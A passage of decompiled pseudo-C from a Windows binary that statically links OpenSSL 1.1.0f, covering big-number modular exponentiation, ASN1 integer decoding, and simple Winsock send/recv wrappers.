  __int64 v64; // r15
  int v65; // eax
  int v66; // esi
  int v67; // edi
  int v68; // eax
  int v69; // [rsp+30h] [rbp+0h] BYREF
  int v70; // [rsp+34h] [rbp+4h]
  int *v71; // [rsp+38h] [rbp+8h]
  int v72; // [rsp+40h] [rbp+10h]
  char *v73; // [rsp+48h] [rbp+18h]
  __int64 v74; // [rsp+50h] [rbp+20h] BYREF
  int v75; // [rsp+58h] [rbp+28h]
  int v76; // [rsp+5Ch] [rbp+2Ch]
  int v77; // [rsp+60h] [rbp+30h]
  int v78; // [rsp+64h] [rbp+34h]
  __int64 v79; // [rsp+68h] [rbp+38h] BYREF
  int v80; // [rsp+70h] [rbp+40h]
  int v81; // [rsp+74h] [rbp+44h]
  int v82; // [rsp+78h] [rbp+48h]
  int v83; // [rsp+7Ch] [rbp+4Ch]
  __int64 *v84; // [rsp+80h] [rbp+50h]
  __int64 v85; // [rsp+88h] [rbp+58h]
  __int64 v86; // [rsp+90h] [rbp+60h]
  __int64 v87; // [rsp+98h] [rbp+68h]

  v6 = 0;
  v87 = a1;
  v72 = 0;
  v85 = a3;
  v73 = 0i64;
  v9 = 0i64;
  v84 = a2;
  if ( !sub_1400270F0(a4) )
  {
    sub_140024610(3, 124, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp.c", 623);
    return 0i64;
  }
  v69 = *(_DWORD *)(a4 + 8);
  v12 = sub_140027260(a3);
  if ( !v12 )
  {
    if ( !sub_140027110(a4) )
      return sub_140027560(a1, 1i64);
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  v13 = a5;
  sub_140027D40(a5);
  if ( a6 )
  {
    v14 = a6;
  }
  else
  {
    v15 = sub_14003C400();
    v14 = (__int64)v15;
    if ( !v15 || !(unsigned int)sub_14003C480((__int64)v15, (__int64 **)a4, a5) )
      goto LABEL_48;
  }
  v16 = 3;
  if ( v12 <= 937 )
  {
    if ( v12 <= 306 )
    {
      if ( v12 <= 89 )
      {
        v17 = 1;
        if ( v12 > 22 )
          v17 = 3;
      }
      else
      {
        v17 = 4;
      }
    }
    else
    {
      v17 = 5;
    }
  }
  else
  {
    v17 = 6;
  }
  v70 = 1 << v17;
  v18 = 2 * v69;
  if ( 2 * v69 <= 1 << v17 )
    v18 = 1 << v17;
  v19 = 8 * (v69 * (1 << v17) + v18);
  v72 = v19;
  v20 = v19 + 64;
  if ( v19 >= 3072 )
  {
    v9 = (unsigned __int64)sub_14001D8E0(v20);
    if ( !v9 )
      goto LABEL_46;
    v19 = v72;
  }
  else
  {
    v21 = v19 + 64 + 15i64;
    if ( v20 + 15 <= v20 )
      v21 = 0xFFFFFFFFFFFFFF0i64;
    v22 = alloca(v21 & 0xFFFFFFFFFFFFFFF0ui64);
    v9 = (unsigned __int64)&v69;
  }
  v73 = (char *)((v9 & 0xFFFFFFFFFFFFFFC0ui64) + 64);
  memset(v73, 0, v19);
  v23 = v69;
  v24 = 0i64;
  if ( v72 >= 3072 )
    v24 = v9;
  v80 = 0;
  v9 = v24;
  v71 = (int *)v24;
  v75 = 0;
  v82 = 0;
  v77 = 0;
  v25 = v69 - 1;
  v81 = v69;
  i = (__int64)&v73[8 * v69 * (__int64)v70];
  v76 = v69;
  v74 = i;
  v79 = i + 8i64 * v69;
  v83 = 2;
  v78 = 2;
  v27 = 8i64 * (v69 - 1);
  v28 = *(__int64 **)a4;
  v86 = v27;
  if ( v28[(unsigned __int64)v27 / 8] >= 0 )
  {
    v34 = sub_140027650();
    if ( (unsigned int)sub_1400275D0((__int64)&v74, (__int64)v34, v14, a5) )
      goto LABEL_42;
LABEL_46:
    v6 = 0;
    goto LABEL_47;
  }
  *(_QWORD *)i = -*v28;
  LODWORD(i) = 1;
  if ( (int)v23 > 1 && v25 >= 4 )
  {
    v29 = *(__int64 **)a4;
    v30 = v74 + v27;
    if ( (v74 + 8 > (unsigned __int64)(*(_QWORD *)a4 + v86) || v30 < (unsigned __int64)(v29 + 1))
      && (v74 + 8 > a4 || v30 < a4) )
    {
      si128 = _mm_load_si128((const __m128i *)&xmmword_14010E690);
      v32 = v23 - (int)v25 % 4;
      v33 = 1i64;
      do
      {
        LODWORD(i) = i + 4;
        *(__m128i *)(v74 + 8 * v33) = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v29[v33]), si128);
        *(__m128i *)(v74 + 8 * v33 + 16) = _mm_andnot_si128(_mm_loadu_si128((const __m128i *)&v29[v33 + 2]), si128);
        v33 += 4i64;
      }
      while ( v33 < v32 );
    }
  }
  for ( i = (int)i; i < v23; ++i )
    *(_QWORD *)(v74 + 8 * i) = ~*(_QWORD *)(*(_QWORD *)a4 + 8 * i);
  v75 = v23;
LABEL_42:
  v35 = v84;
  if ( *((_DWORD *)v84 + 4) || (int)sub_140027600(v84, (__int64 *)a4) >= 0 )
  {
    v9 = (unsigned __int64)v71;
    if ( !(unsigned int)sub_140041D70(0i64, (__int64)&v79, (__int64)v84, a4, a5)
      || !(unsigned int)sub_1400275D0((__int64)&v79, (__int64)&v79, v14, a5) )
    {
      goto LABEL_46;
    }
  }
  else if ( !(unsigned int)sub_1400275D0((__int64)&v79, (__int64)v35, v14, a5) )
  {
LABEL_45:
    v9 = (unsigned __int64)v71;
    goto LABEL_46;
  }
  v36 = v69;
  v37 = v69;
  if ( v69 > v75 )
    v37 = v75;
  v38 = v37;
  if ( v37 <= 0 )
  {
    v39 = v70;
  }
  else
  {
    v39 = v70;
    v40 = 0i64;
    v41 = v73;
    v42 = 8i64 * v70;
    do
    {
      v43 = *(_QWORD *)(v74 + 8 * v40++);
      *v41 = v43;
      v41 = (_QWORD *)((char *)v41 + v42);
    }
    while ( v40 < v38 );
  }
  v44 = v36;
  if ( v36 > v80 )
    v44 = v80;
  v45 = v44;
  if ( v44 > 0 )
  {
    v46 = 0i64;
    v47 = v73 + 8;
    do
    {
      v48 = *(_QWORD *)(v79 + 8 * v46++);
      *v47 = v48;
      v47 += v39;
    }
    while ( v46 < v45 );
  }
  if ( (unsigned int)v17 > 1 )
  {
    v9 = (unsigned __int64)v71;
    if ( !(unsigned int)sub_14003CA60((__int64)&v74, (__int64)&v79, (__int64)&v79, v14, a5) )
      goto LABEL_46;
    v49 = v69;
    if ( v69 > v75 )
      v49 = v75;
    v50 = v49;
    if ( v49 <= 0 )
    {
      v51 = v70;
    }
    else
    {
      v51 = v70;
      v52 = 0i64;
      v53 = v73 + 16;
      v54 = 8i64 * v70;
      do
      {
        v55 = *(_QWORD *)(v74 + 8 * v52++);
        *v53 = v55;
        v53 = (_QWORD *)((char *)v53 + v54);
      }
      while ( v52 < v50 );
    }
    if ( v51 > 3 )
    {
      while ( (unsigned int)sub_14003CA60((__int64)&v74, (__int64)&v79, (__int64)&v74, v14, a5) )
      {
        v56 = 0i64;
        v57 = v69;
        if ( v69 > v75 )
          v57 = v75;
        v58 = v57;
        if ( v57 > 0 )
        {
          v59 = &v73[8 * v16];
          do
          {
            v60 = *(_QWORD *)(v74 + 8 * v56++);
            *(_QWORD *)v59 = v60;
            v59 += 8 * v51;
          }
          while ( v56 < v58 );
        }
        if ( ++v16 >= v51 )
          goto LABEL_83;
      }
      goto LABEL_45;
    }
  }
LABEL_83:
  v61 = v12 - 1;
  v62 = 0;
  v63 = v61 % v17;
  if ( v61 % v17 >= 0 )
  {
    v64 = v85;
    do
    {
      v65 = sub_1400270A0(v64, v61--);
      --v63;
      v62 = v65 + 2 * v62;
    }
    while ( v63 >= 0 );
    v13 = a5;
  }
  v9 = (unsigned __int64)v71;
  if ( !(unsigned int)sub_14007D240((__int64)&v74, v69, (__int64)v73, v62, v17) )
    goto LABEL_46;
  if ( v61 >= 0 )
  {
LABEL_89:
    v66 = 0;
    v67 = 0;
    while ( (unsigned int)sub_14003CA60((__int64)&v74, (__int64)&v74, (__int64)&v74, v14, v13) )
    {
      v68 = sub_1400270A0(v85, v61);
      ++v67;
      --v61;
      v66 = v68 + 2 * v66;
      if ( v67 >= v17 )
      {
        if ( !(unsigned int)sub_14007D240((__int64)&v79, v69, (__int64)v73, v66, v17)
          || !(unsigned int)sub_14003CA60((__int64)&v74, (__int64)&v74, (__int64)&v79, v14, v13) )
        {
          goto LABEL_45;
        }
        if ( v61 >= 0 )
          goto LABEL_89;
        goto LABEL_95;
      }
    }
    goto LABEL_45;
  }
LABEL_95:
  v9 = (unsigned __int64)v71;
  if ( !(unsigned int)sub_14003C750(v87, (__int64)&v74, v14, v13) )
    goto LABEL_46;
  v6 = 1;
LABEL_47:
  if ( !a6 )
LABEL_48:
    sub_14003C3A0(v14);
  if ( v73 )
  {
    sub_140023440((__int64)v73, v72);
    sub_14001D930((void *)v9);
  }
  sub_140027B60((__int64)v13);
  return v6;
}
// 14010E690: using guessed type __int128 xmmword_14010E690;

//----- (000000014007CA40) ----------------------------------------------------
__int64 __fastcall sub_14007CA40(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4, int *a5, __int64 a6)
{
  int v6; // eax
  unsigned __int64 v7; // rbx
  unsigned int v9; // r12d
  __int64 v10; // r13
  int v14; // esi
  _QWORD *v15; // rbx
  _QWORD *v16; // rdi
  _QWORD *v17; // rax
  __int64 v18; // r15
  _DWORD *v19; // rax
  unsigned __int64 v20; // rbx
  int i; // ebp
  __int64 v22; // rsi
  _QWORD *v23; // rax
  unsigned __int64 v24; // rsi
  _QWORD *v25; // rax
  int v26; // [rsp+30h] [rbp-58h]
  unsigned __int64 v28; // [rsp+98h] [rbp+10h]

  v28 = a2;
  v7 = a2;
  v9 = 0;
  v10 = 0i64;
  if ( (unsigned int)sub_140027070(a3, v6 - 84) )
  {
    sub_140024610(3, 117, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp.c", 1126);
    return 0i64;
  }
  if ( !sub_1400270F0(a4) )
  {
    sub_140024610(3, 117, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp.c", 1134);
    return 0i64;
  }
  if ( *(_DWORD *)(a4 + 8) == 1 )
  {
    v7 %= **(_QWORD **)a4;
    v28 = v7;
  }
  v14 = sub_140027260(a3);
  if ( v14 )
  {
    if ( !v7 )
      goto LABEL_9;
    sub_140027D40(a5);
    v15 = sub_140027C40(a5);
    v16 = sub_140027C40(a5);
    v17 = sub_140027C40(a5);
    v18 = (__int64)v17;
    if ( v15 && v16 && v17 )
    {
      if ( a6 )
      {
        v10 = a6;
      }
      else
      {
        v19 = sub_14003C400();
        v10 = (__int64)v19;
        if ( !v19 || !(unsigned int)sub_14003C480((__int64)v19, (__int64 **)a4, a5) )
          goto LABEL_50;
      }
      v20 = v28;
      v26 = v14 - 2;
      v9 = 1;
      for ( i = 1; v26 >= 0; --v26 )
      {
        v22 = v20 * v20;
        if ( v20 * v20 / v20 != v20 )
        {
          if ( i )
          {
            if ( !(unsigned int)sub_140027560((__int64)v16, v20)
              || !(unsigned int)sub_1400275D0((__int64)v16, (__int64)v16, v10, a5) )
            {
              goto LABEL_48;
            }
            i = 0;
          }
          else
          {
            if ( !(unsigned int)sub_14003E8F0((__int64)v16, v20)
              || !(unsigned int)sub_140041D70(0i64, v18, (__int64)v16, a4, a5) )
            {
              goto LABEL_48;
            }
            v23 = v16;
            v16 = (_QWORD *)v18;
            v18 = (__int64)v23;
          }
          v22 = 1i64;
        }
        v20 = v22;
        if ( !i && !(unsigned int)sub_14003CA60((__int64)v16, (__int64)v16, (__int64)v16, v10, a5) )
          goto LABEL_48;
        if ( (unsigned int)sub_1400270A0(a3, v26) )
        {
          v24 = v28 * v22;
          if ( v24 / v28 != v20 )
          {
            if ( i )
            {
              if ( !(unsigned int)sub_140027560((__int64)v16, v20)
                || !(unsigned int)sub_1400275D0((__int64)v16, (__int64)v16, v10, a5) )
              {
                goto LABEL_48;
              }
              i = 0;
            }
            else
            {
              if ( !(unsigned int)sub_14003E8F0((__int64)v16, v20)
                || !(unsigned int)sub_140041D70(0i64, v18, (__int64)v16, a4, a5) )
              {
                goto LABEL_48;
              }
              v25 = v16;
              v16 = (_QWORD *)v18;
              v18 = (__int64)v25;
            }
            v24 = v28;
          }
          v20 = v24;
        }
      }
      if ( v20 != 1 )
      {
        if ( i )
        {
          if ( (unsigned int)sub_140027560((__int64)v16, v20)
            && (unsigned int)sub_1400275D0((__int64)v16, (__int64)v16, v10, a5) )
          {
LABEL_47:
            if ( (unsigned int)sub_14003C750(a1, (__int64)v16, v10, a5) )
              goto LABEL_49;
            goto LABEL_48;
          }
        }
        else if ( (unsigned int)sub_14003E8F0((__int64)v16, v20)
               && (unsigned int)sub_140041D70(0i64, v18, (__int64)v16, a4, a5) )
        {
          v16 = (_QWORD *)v18;
          goto LABEL_47;
        }
        goto LABEL_48;
      }
      if ( !i )
        goto LABEL_47;
      if ( !(unsigned int)sub_140027560(a1, 1i64) )
LABEL_48:
        v9 = 0;
    }
LABEL_49:
    if ( a6 )
    {
LABEL_51:
      sub_140027B60((__int64)a5);
      return v9;
    }
LABEL_50:
    sub_14003C3A0(v10);
    goto LABEL_51;
  }
  if ( sub_140027110(a4) )
  {
LABEL_9:
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  return sub_140027560(a1, 1i64);
}
// 14007CA72: variable 'v6' is possibly undefined

//----- (000000014007CE60) ----------------------------------------------------
__int64 __fastcall sub_14007CE60(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  int v10; // r14d
  _QWORD *v11; // rsi
  _QWORD *v12; // rax
  __int64 v13; // rdi
  __int64 v14; // rdx
  unsigned int v15; // ebx
  int v16; // eax
  __int64 v17; // rbx
  __int64 v18; // rdi
  _QWORD *v19; // rax
  int v20; // ebx
  int v21; // r14d
  int v22; // r15d
  int v23; // esi
  int v24; // ebx
  int v25; // edi
  char v26; // cl
  int v27; // edi
  int v28; // ebx
  unsigned int v29; // [rsp+30h] [rbp-1B8h]
  unsigned int v30; // [rsp+34h] [rbp-1B4h]
  int v31; // [rsp+38h] [rbp-1B0h]
  _QWORD v33[8]; // [rsp+50h] [rbp-198h] BYREF
  __int64 v34[32]; // [rsp+90h] [rbp-158h]

  v30 = 0;
  v29 = 4;
  if ( (unsigned int)sub_140027070(a3, 4u) )
  {
    sub_140024610(3, 125, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp.c", 180);
    return 0i64;
  }
  v10 = sub_140027260(a3);
  if ( v10 )
  {
    sub_140027D40(a5);
    v11 = sub_140027C40(a5);
    v12 = sub_140027C40(a5);
    v34[0] = (__int64)v12;
    v13 = (__int64)v12;
    if ( !v11 || !v12 )
      goto LABEL_49;
    sub_1400B2040(v33);
    v14 = a4;
    if ( *(_DWORD *)(a4 + 16) )
    {
      if ( !sub_140026E90((__int64)v11, a4) )
      {
LABEL_49:
        sub_140027B60((__int64)a5);
        sub_1400B1FF0((__int64)v33);
        return v30;
      }
      *((_DWORD *)v11 + 4) = 0;
      v14 = (__int64)v11;
    }
    if ( (int)sub_1400B2090((__int64)v33, v14) <= 0 || !(unsigned int)sub_1400798F0(v13, a2, a4, a5) )
      goto LABEL_49;
    if ( sub_140027160(v13) )
    {
      sub_140027560((__int64)a1, 0i64);
      v30 = 1;
      goto LABEL_49;
    }
    if ( v10 <= 671 )
    {
      if ( v10 <= 239 )
      {
        if ( v10 <= 79 )
        {
          v15 = 1;
          if ( v10 > 23 )
            v15 = 3;
          v29 = v15;
          if ( v15 <= 1 )
            goto LABEL_30;
        }
        else
        {
          LOBYTE(v15) = 4;
        }
      }
      else
      {
        LOBYTE(v15) = 5;
        v29 = 5;
      }
    }
    else
    {
      LOBYTE(v15) = 6;
      v29 = 6;
    }
    if ( !(unsigned int)sub_1400B2360(v11, v13, v13, (__int64)v33, a5) )
      goto LABEL_49;
    v16 = 1 << (v15 - 1);
    v17 = 1i64;
    v18 = v16;
    if ( v16 > 1i64 )
    {
      do
      {
        v19 = sub_140027C40(a5);
        v34[v17] = (__int64)v19;
        if ( !v19 || !(unsigned int)sub_1400B2360(v19, v33[v17 + 7], (__int64)v11, (__int64)v33, a5) )
          goto LABEL_49;
      }
      while ( ++v17 < v18 );
    }
LABEL_30:
    v20 = 1;
    v31 = 1;
    v21 = v10 - 1;
    if ( (unsigned int)sub_140027560((__int64)a1, 1i64) )
    {
      while ( 1 )
      {
        while ( !(unsigned int)sub_1400270A0(a3, v21) )
        {
          if ( !v20 && !(unsigned int)sub_1400B2360(a1, (__int64)a1, (__int64)a1, (__int64)v33, a5) )
            goto LABEL_49;
          if ( !v21 )
          {
LABEL_48:
            v30 = 1;
            goto LABEL_49;
          }
          --v21;
        }
        v22 = 0;
        v23 = 1;
        v24 = 1;
        if ( v29 > 1 )
        {
          v25 = v21 - 1;
          do
          {
            if ( v25 < 0 )
              break;
            if ( (unsigned int)sub_1400270A0(a3, v25) )
            {
              v26 = v24 - v22;
              v22 = v24;
              v23 = (v23 << v26) | 1;
            }
            ++v24;
            --v25;
          }
          while ( v24 < (int)v29 );
        }
        v27 = v22 + 1;
        if ( !v31 )
        {
          v28 = 0;
          if ( v27 > 0 )
            break;
        }
LABEL_46:
        if ( !(unsigned int)sub_1400B2360(a1, (__int64)a1, v34[(__int64)v23 >> 1], (__int64)v33, a5) )
          goto LABEL_49;
        v20 = 0;
        v31 = 0;
        v21 += -1 - v22;
        if ( v21 < 0 )
          goto LABEL_48;
      }
      while ( (unsigned int)sub_1400B2360(a1, (__int64)a1, (__int64)a1, (__int64)v33, a5) )
      {
        if ( ++v28 >= v27 )
          goto LABEL_46;
      }
    }
    goto LABEL_49;
  }
  if ( !sub_140027110(a4) )
    return sub_140027560((__int64)a1, 1i64);
  sub_140027560((__int64)a1, 0i64);
  return 1i64;
}
// 14007CE60: using guessed type __int64 var_158[32];

//----- (000000014007D240) ----------------------------------------------------
__int64 __fastcall sub_14007D240(__int64 a1, int a2, __int64 a3, int a4, int a5)
{
  __int64 v5; // r13
  __int64 v6; // r14
  int v7; // ebx
  __int64 v9; // rdi
  __int64 result; // rax
  __int64 v11; // r11
  __int64 v12; // r10
  __int64 v13; // r9
  int v14; // edx
  __int64 v15; // r8
  int v16; // ecx
  int v17; // edx
  __int64 v18; // r15
  __int64 v19; // rbp
  int v20; // esi
  __int64 v21; // rdx
  __int64 v22; // rax
  __int64 v23; // rbx
  unsigned int v24; // r10d
  __int64 v25; // rax
  __int64 v26; // r14
  __int64 v27; // rcx
  __int64 v28; // r8
  unsigned int v29; // edx
  unsigned int v30; // r9d
  __int64 v31; // [rsp+20h] [rbp-78h]
  __int64 v32; // [rsp+28h] [rbp-70h]
  __int64 v33; // [rsp+30h] [rbp-68h]
  __int64 v34; // [rsp+38h] [rbp-60h]
  __int64 v35; // [rsp+40h] [rbp-58h]
  __int64 v36; // [rsp+48h] [rbp-50h]
  __int64 v37; // [rsp+50h] [rbp-48h]
  __int64 v40; // [rsp+B0h] [rbp+18h]

  v40 = a3;
  v5 = a1;
  v6 = a2;
  v7 = 1 << a5;
  v9 = a3;
  result = (__int64)sub_140027B30(a1, a2);
  if ( result )
  {
    v36 = v6;
    v11 = v6;
    if ( a5 > 3 )
    {
      v17 = a4 >> (a5 - 2);
      v18 = 0i64;
      v19 = 1 << (a5 - 2);
      v32 = 0i64;
      v20 = ((1 << (a5 - 2)) - 1) & a4;
      v33 = -(__int64)(-(((unsigned int)(v17 - 1) >> 31) & (v17 >= 0)) & 1);
      v34 = -(__int64)(-((v17 >= 0) & (((v17 ^ 1u) - 1) >> 31)) & 1);
      v35 = -(__int64)(-((v17 >= 0) & (((v17 ^ 2u) - 1) >> 31)) & 1);
      v21 = -(__int64)(-((((v17 ^ 3u) - 1) >> 31) & (v17 >= 0)) & 1);
      v31 = v21;
      if ( (int)v6 > 0 )
      {
        v22 = 8i64 * v7;
        v37 = v22;
        do
        {
          v23 = 0i64;
          v24 = 0;
          if ( v19 > 0 )
          {
            v25 = v9 + 16 * v19;
            v26 = 1 << (a5 - 2);
            do
            {
              v27 = *(_QWORD *)(v25 + 8 * v19);
              v25 += 8i64;
              v28 = v21 & v27 | v35 & *(_QWORD *)(v25 - 8) | v34 & *(_QWORD *)(-8 * v19 + v25 - 8);
              v29 = ((v20 ^ v24) - 1) >> 31;
              v30 = ~(v20 ^ v24++);
              v23 |= (v28 | v33 & *(_QWORD *)(v25 - 16 * v19 - 8)) & -(__int64)(-((v30 >> 31) & v29) & 1);
              v21 = v31;
              --v26;
            }
            while ( v26 );
            v9 = v40;
            v18 = v32;
            v5 = a1;
            v11 = v36;
            v22 = v37;
          }
          v9 += v22;
          v40 = v9;
          *(_QWORD *)(*(_QWORD *)v5 + 8 * v18++) = v23;
          v32 = v18;
        }
        while ( v18 < v11 );
        LODWORD(v6) = a2;
      }
    }
    else
    {
      v12 = 0i64;
      if ( (int)v6 > 0 )
      {
        do
        {
          v13 = 0i64;
          v14 = 0;
          if ( v7 > 0 )
          {
            v15 = v9;
            do
            {
              v15 += 8i64;
              v16 = a4 ^ v14++;
              v13 |= *(_QWORD *)(v15 - 8) & -(__int64)(-(((unsigned int)(v16 - 1) >> 31) & (v16 >= 0)) & 1);
            }
            while ( v14 < v7 );
          }
          v9 += 8i64 * v7;
          *(_QWORD *)(*(_QWORD *)v5 + 8 * v12++) = v13;
        }
        while ( v12 < v6 );
      }
    }
    *(_DWORD *)(v5 + 8) = v6;
    sub_1400278D0(v5);
    return 1i64;
  }
  return result;
}

//----- (000000014007D4F0) ----------------------------------------------------
__int64 __fastcall sub_14007D4F0(__int64 a1, const char *a2, int a3)
{
  int v6; // ebx

  WSASetLastError(0);
  v6 = send(*(int *)(a1 + 40), a2, a3, 0);
  sub_140029A60(a1, 15);
  if ( v6 <= 0 && (unsigned int)sub_14007D810(v6) )
    sub_14002A400(a1, 10);
  return (unsigned int)v6;
}

//----- (000000014007D570) ----------------------------------------------------
__int64 __fastcall sub_14007D570(__int64 a1, char *a2, int a3)
{
  int v6; // ebx

  if ( !a2 )
    return 0i64;
  WSASetLastError(0);
  v6 = recv(*(int *)(a1 + 40), a2, a3, 0);
  sub_140029A60(a1, 15);
  if ( v6 <= 0 )
  {
    if ( (unsigned int)sub_14007D810(v6) )
      sub_14002A400(a1, 9);
  }
  return (unsigned int)v6;
}

//----- (000000014007D600) ----------------------------------------------------
__int64 __fastcall sub_14007D600(__int64 a1, const char *a2)
{
  unsigned int v2; // r8d
  const char *i; // rax

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  return sub_14007D4F0(a1, a2, v2 & 0x7FFFFFFF);
}

//----- (000000014007D650) ----------------------------------------------------
__int64 __fastcall sub_14007D650(_DWORD *a1, int a2, int a3, _DWORD *a4)
{
  __int64 result; // rax

  switch ( a2 )
  {
    case 8:
      result = (unsigned int)a1[7];
      break;
    case 9:
      a1[7] = a3;
      result = 1i64;
      break;
    case 11:
    case 12:
      goto LABEL_3;
    case 104:
      sub_14007D7C0(a1);
      a1[10] = *a4;
      a1[7] = a3;
      a1[6] = 1;
LABEL_3:
      result = 1i64;
      break;
    case 105:
      if ( a1[6] )
      {
        if ( a4 )
          *a4 = a1[10];
        result = (unsigned int)a1[10];
      }
      else
      {
        result = 0xFFFFFFFFi64;
      }
      break;
    default:
      result = 0i64;
      break;
  }
  return result;
}

//----- (000000014007D7C0) ----------------------------------------------------
__int64 __fastcall sub_14007D7C0(_DWORD *a1)
{
  if ( !a1 )
    return 0i64;
  if ( a1[7] )
  {
    if ( a1[6] )
      sub_14007D880(a1[10]);
    a1[6] = 0;
    a1[8] = 0;
  }
  return 1i64;
}

//----- (000000014007D810) ----------------------------------------------------
__int64 __fastcall sub_14007D810(int a1)
{
  int Error; // eax
  int v2; // ecx
  unsigned int v3; // eax
  int v4; // edx

  if ( (unsigned int)(a1 + 1) > 1 )
    return 0i64;
  Error = WSAGetLastError();
  v2 = Error;
  if ( Error > 126 )
  {
    if ( Error == 134 || Error == 140 )
      return 1i64;
    return Error == 10035;
  }
  else
  {
    v3 = Error - 103;
    if ( v3 <= 0x17 )
    {
      v4 = 8389121;
      if ( _bittest(&v4, v3) )
        return 1i64;
    }
    if ( v2 == 4 )
      return 1i64;
    return v2 == 11;
  }
}

//----- (000000014007D880) ----------------------------------------------------
_BOOL8 __fastcall sub_14007D880(int a1)
{
  return closesocket(a1) >= 0;
}

//----- (000000014007D8B0) ----------------------------------------------------
__int64 __fastcall sub_14007D8B0(int *a1)
{
  __int64 result; // rax
  int v2; // r9d
  unsigned __int64 v3; // rax
  unsigned __int64 v4; // [rsp+30h] [rbp+8h] BYREF

  if ( !a1 )
    return 0i64;
  v2 = a1[1];
  if ( (v2 & 0xFFFFFEFF) != 10 )
    return 0xFFFFFFFFi64;
  v3 = *a1;
  if ( (int)v3 > 4 || !(unsigned int)sub_14007DAC0(&v4, *((_QWORD *)a1 + 1), v3, v2 & 0x100) )
    return 0xFFFFFFFFi64;
  result = 0xFFFFFFFFi64;
  if ( v4 + 0x80000000 <= 0xFFFFFFFF )
    return (unsigned int)v4;
  return result;
}

//----- (000000014007D930) ----------------------------------------------------
__int64 __fastcall sub_14007D930(__int64 a1, __int64 a2)
{
  int v2; // eax

  return sub_14007DD90(a1, a2, v2 - 30);
}
// 14007D93D: variable 'v2' is possibly undefined

//----- (000000014007D950) ----------------------------------------------------
int __fastcall sub_14007D950(__int64 a1, __int64 a2)
{
  int v2; // ebx
  int result; // eax

  v2 = *(_DWORD *)(a1 + 4) & 0x100;
  if ( v2 == (*(_DWORD *)(a2 + 4) & 0x100) )
  {
    result = sub_140047390((const void **)a1, a2);
    if ( v2 )
      return -result;
  }
  else
  {
    result = 1;
    if ( v2 )
      return -1;
  }
  return result;
}

//----- (000000014007D9A0) ----------------------------------------------------
__int64 __fastcall sub_14007D9A0(int *a1)
{
  __int64 result; // rax
  int v2; // r9d
  unsigned __int64 v3; // [rsp+40h] [rbp+8h] BYREF

  if ( !a1 )
    return 0i64;
  v2 = a1[1];
  if ( (v2 & 0xFFFFFEFF) == 2 )
  {
    if ( (unsigned int)sub_14007DAC0(&v3, *((_QWORD *)a1 + 1), *a1, v2 & 0x100) )
    {
      result = 0xFFFFFFFFi64;
      if ( v3 + 0x80000000 <= 0xFFFFFFFF )
        return (unsigned int)v3;
    }
    else
    {
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(13, 227, 225, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 326);
    return 0xFFFFFFFFi64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014007DA40) ----------------------------------------------------
__int64 __fastcall sub_14007DA40(__int64 *a1, int *a2)
{
  int v2; // eax

  return sub_14007DC30(a1, a2, v2 - 38);
}
// 14007DA4D: variable 'v2' is possibly undefined

//----- (000000014007DA60) ----------------------------------------------------
__int64 __fastcall sub_14007DA60(__int64 a1, int a2)
{
  int v2; // eax

  return sub_14007DCF0(a1, a2, v2 - 38);
}
// 14007DA70: variable 'v2' is possibly undefined

//----- (000000014007DA80) ----------------------------------------------------
__int64 __fastcall sub_14007DA80(__int64 a1, __int64 a2)
{
  int v2; // eax

  return sub_14007DD90(a1, a2, v2 - 38);
}
// 14007DA8D: variable 'v2' is possibly undefined

//----- (000000014007DAA0) ----------------------------------------------------
_DWORD *__fastcall sub_14007DAA0(__int64 a1, _DWORD *a2)
{
  int v2; // eax

  return sub_14007DE50(a1, a2, v2 - 38);
}
// 14007DAAD: variable 'v2' is possibly undefined

//----- (000000014007DAC0) ----------------------------------------------------
__int64 __fastcall sub_14007DAC0(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3, int a4)
{
  int v6; // edx
  unsigned __int64 v7; // rcx
  unsigned __int64 i; // rdx
  __int64 v9; // rax
  __int64 result; // rax
  int v11; // [rsp+20h] [rbp-18h]

  if ( a3 > 8 )
  {
    v11 = 213;
    v6 = 225;
LABEL_15:
    sub_140024610(13, v6, 223, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", v11);
    return 0i64;
  }
  if ( a2 )
  {
    v7 = 0i64;
    for ( i = 0i64; i < a3; v7 = v9 | (v7 << 8) )
    {
      v9 = *(unsigned __int8 *)(i + a2);
      ++i;
    }
    if ( a4 )
    {
      if ( v7 <= 0x7FFFFFFFFFFFFFFFi64 )
      {
        result = 1i64;
        *a1 = -(__int64)v7;
        return result;
      }
      if ( v7 == 0x8000000000000000ui64 )
      {
        *a1 = 0x8000000000000000ui64;
        return 1i64;
      }
      sub_140024610(13, 224, 224, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 265);
      return 0i64;
    }
    if ( v7 <= 0x7FFFFFFFFFFFFFFFi64 )
    {
      *a1 = v7;
      return 1i64;
    }
    v11 = 272;
    v6 = 224;
    goto LABEL_15;
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014007DBB0) ----------------------------------------------------
__int64 __fastcall sub_14007DBB0(__int64 *a1, __int64 a2, unsigned __int64 a3)
{
  int v3; // eax
  __int64 v7; // rcx
  unsigned __int64 i; // rdx
  __int64 v9; // rax

  if ( a3 > 8 )
  {
    sub_140024610(v3 - 43, 225, 223, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_int.c", 213);
    return 0i64;
  }
  if ( !a2 )
    return 0i64;
  v7 = 0i64;
  for ( i = 0i64; i < a3; v7 = v9 | (v7 << 8) )
  {
    v9 = *(unsigned __int8 *)(i + a2);
    ++i;
  }
  *a1 = v7;
  return 1i64;
}
